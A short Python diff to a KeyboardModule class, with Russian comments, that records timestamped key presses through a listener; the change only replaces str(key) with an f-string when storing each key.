@@ -21,7 +21,7 @@ class KeyboardModule(BaseModule):
     def key_tracking(key_events):
         # Метод обрабатывающий нажатие клавиш
         # при получении события нажатия на кнопку добавляем данные в массив
-        with Listener(on_press=lambda key: key_events.append({'time': time(), 'button': str(key)})) as listener:
+        with Listener(on_press=lambda key: key_events.append({'time': time(), 'button': f'{key}'})) as listener:
             listener.join()
 
     def update(self):
